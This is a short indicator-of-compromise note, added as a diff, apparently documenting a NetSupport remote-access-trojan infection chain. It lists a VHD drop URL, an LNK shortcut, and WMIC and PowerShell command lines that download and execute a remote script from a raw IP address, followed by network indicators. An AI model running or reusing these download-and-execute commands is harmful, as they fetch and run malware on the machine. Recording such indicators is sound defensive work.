@@ -1,0 +1,23 @@
+NetSupport | 18.02.2022 | 
+
+***************************************************************
+
+https://hlmequipment.com/view_order.php (vhd drop) 
+
+Exec 
+
+cmd /c C:\Users\Admin\AppData\Local\Temp\Order_confimation.doc.lnk
+
+C:\Windows\System32\wbem\WMIC.exe" process call create "cmd /c start /min C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX (iwr -usebasicparsing 'http://5.252.178.213/restore.dat')"
+
+cmd /c start /min C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX (iwr -usebasicparsing 'http://5.252.178.213/restore.dat')
+
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe  -c IEX (iwr -usebasicparsing 'http://5.252.178.213/restore.dat')
+
+"C:\Users\Admin\AppData\Roaming\M9MXNDI1\taskhostw.exe" 
+
+Network
+
+http://5.252.178.213/restore.dat
+http://5.252.178.213/thumb_cdn.png
+contentcdns.net
